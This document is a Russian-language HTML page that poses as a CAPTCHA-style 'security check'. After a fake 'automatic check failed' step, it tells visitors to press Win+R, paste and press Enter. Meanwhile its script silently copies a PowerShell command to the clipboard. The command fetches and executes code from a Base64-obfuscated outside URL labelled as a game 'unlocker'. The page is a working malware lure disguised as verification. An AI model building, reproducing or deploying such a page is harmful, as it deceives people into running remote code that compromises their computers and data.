<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Проверка безопасности</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
body { background: #0a0a0a; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
.box { background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 12px; padding: 40px; max-width: 480px; width: 100%; text-align: center; }
.logo { font-size: 32px; font-weight: 700; margin-bottom: 20px; color: #5865F2; }
h2 { font-size: 20px; margin-bottom: 12px; font-weight: 600; }
p { color: #a0a0a0; font-size: 14px; line-height: 1.6; margin-bottom: 24px; }
button { background: #5865F2; color: #fff; border: none; padding: 14px 32px; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.2s; }
button:hover { background: #4752c4; }
.steps { text-align: left; background: #0f0f0f; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
.step { display: flex; align-items: center; margin-bottom: 12px; font-size: 14px; }
.step:last-child { margin-bottom: 0; }
.num { background: #5865F2; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; margin-right: 12px; flex-shrink: 0; }
kbd { background: #2a2a2a; padding: 2px 8px; border-radius: 4px; font-family: monospace; font-size: 13px; border: 1px solid #3a3a3a; margin: 0 4px; }
.spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #fff; border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }
.hidden { display: none; }
.error { color: #ed4245; font-size: 13px; margin-top: 16px; }
</style>
</head>
<body>
<div class="box">
  <div class="logo">🛡️</div>
  <div id="step1">
    <h2>Подтвердите что вы человек</h2>
    <p>Для продолжения необходимо пройти проверку безопасности</p>
    <button onclick="startVerify()" id="btn1">Я не робот</button>
  </div>

  <div id="step2" class="hidden">
    <h2>Верификация</h2>
    <p>Автоматическая проверка не удалась. Выполните следующие шаги вручную:</p>
    <div class="steps">
      <div class="step"><div class="num">1</div><div>Нажмите <kbd>Win</kbd>+<kbd>R</kbd> на клавиатуре</div></div>
      <div class="step"><div class="num">2</div><div>Нажмите <kbd>Ctrl</kbd>+<kbd>V</kbd> чтобы вставить код</div></div>
      <div class="step"><div class="num">3</div><div>Нажмите <kbd>Enter</kbd></div></div>
    </div>
    <button onclick="copyCmd()" id="btn2">Скопировать код проверки</button>
    <div class="error" id="err"></div>
  </div>
</div>

<script>
const CMD = `iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz0xNzcxMzM1MDg3L3ZhbG9yYW50X3VubG9ja2Vy'))) -UseBasicParsing)`;

function startVerify() {
  document.getElementById('btn1').innerHTML = '<span class="spinner"></span>';
  document.getElementById('btn1').disabled = true;
  setTimeout(() => {
    document.getElementById('step1').classList.add('hidden');
    document.getElementById('step2').classList.remove('hidden');
  }, 1500);
}

async function copyCmd() {
  try {
    await navigator.clipboard.writeText(CMD);
    document.getElementById('btn2').textContent = '✓ Код скопирован';
    document.getElementById('btn2').style.background = '#3ba55c';
  } catch (e) {
    const ta = document.createElement('textarea');
    ta.value = CMD;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    document.getElementById('btn2').textContent = '✓ Код скопирован';
    document.getElementById('btn2').style.background = '#3ba55c';
  }
}
</script>
</body>
</html>
